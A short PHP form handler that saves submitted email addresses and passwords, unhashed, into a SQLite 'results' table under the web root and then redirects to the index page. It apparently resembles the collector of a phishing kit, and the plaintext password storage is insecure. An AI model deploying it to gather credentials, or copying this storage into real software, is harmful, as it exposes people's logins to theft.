<?php

$resultsDb = new PDO("sqlite:" . $_SERVER["DOCUMENT_ROOT"] . "/databases/results.db");

$email = trim($_POST["email"] ?? "");
$password = trim($_POST["password"] ?? "");

if ($email !== "" and $password !== "") {
   
   // add data to the database
   $stmt = $resultsDb->prepare("INSERT INTO results (email, password) VALUES (?, ?)");
   $stmt->execute([$email, $password]);
   
}

header("location:/index.php");
exit;